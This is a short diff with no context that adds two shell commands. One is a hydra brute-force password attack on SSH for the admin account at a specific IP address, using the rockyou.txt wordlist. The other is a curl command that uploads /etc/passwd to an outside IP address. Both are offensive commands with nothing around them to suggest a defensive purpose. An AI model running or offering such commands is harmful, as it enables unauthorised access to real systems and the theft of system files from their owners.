@@ -1,0 +1,2 @@
+hydra -l admin -P rockyou.txt 120.169.203.7 ssh
+curl -X POST -F 'file=@/etc/passwd' http://142.112.30.141/upload
